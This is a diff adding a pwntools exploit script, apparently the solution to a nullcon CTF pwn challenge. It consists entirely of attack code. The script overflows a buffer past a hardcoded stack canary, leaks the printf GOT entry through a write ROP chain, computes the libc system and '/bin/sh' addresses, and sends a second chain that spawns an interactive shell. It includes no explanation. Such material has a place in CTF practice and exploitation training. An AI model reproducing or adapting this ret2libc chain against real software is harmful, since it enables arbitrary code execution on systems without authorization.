@@ -1,0 +1,32 @@
+from pwn import *
+#p = remote("pwn3.ctf.nullcon.net",1234)
+
+p = process("./main",env = {"LD_PRELOAD" : "./libc.so.6"})
+canary = p64(1384596540605918958)
+
+pop_rdi = p64(0x0000000000400ab3)
+printf_plt = p64(0x0000000000400680)
+printf_got = p64(0x0000000000601030)
+write = p64(0x0000000000400660)
+pop_rsi_r15 = 0x0000000000400ab1
+pop_rdx = 0x00000000004007cb
+ret = 0x0040063e
+main = p64(0x400822)
+gdb.attach(p)
+
+p.sendlineafter("hello\n","a"*20 + canary + 'a'*(0x2c-8)  + "b"*8  + p64(ret) +  pop_rdi +  p64(1) + p64(pop_rsi_r15) + printf_got + p64(0) + p64(pop_rdx) + p64(0x8) + write + main)
+
+leak = u64(p.recv(8).strip())
+log.info("leak = " + hex(leak))
+#base = leak - 0x62830
+
+#system  = base + 0x52fd0
+#binsh = base + 0x1afb84
+offset1 = 0x15a40
+offset2 = 0x14f01a
+system = leak - offset1
+binsh = leak + offset2
+p.recvuntil("hello\n")
+p.send("a"*20 + canary + 'a'*(0x2c-8) + "b"*8 + p64(ret) + pop_rdi + p64(binsh) + p64(system) + main)
+
+p.interactive()
